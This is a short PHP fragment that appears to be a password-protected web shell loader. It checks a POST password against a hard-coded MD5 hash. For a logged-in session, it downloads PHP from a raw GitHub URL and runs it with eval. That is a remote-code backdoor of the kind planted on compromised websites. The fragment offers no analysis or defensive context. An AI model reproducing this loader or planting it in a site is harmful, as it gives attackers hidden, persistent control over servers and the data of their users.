...
if (is_logged_in()) {
    ...
    $a = geturlsinfo('https://raw.githubusercontent.com/mangoleh098/geckolama/refs/heads/main/geckovlama.php');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = '6548508e4a326a7560acbfc3e36722f4'; // Replace this with your MD5 hashed password
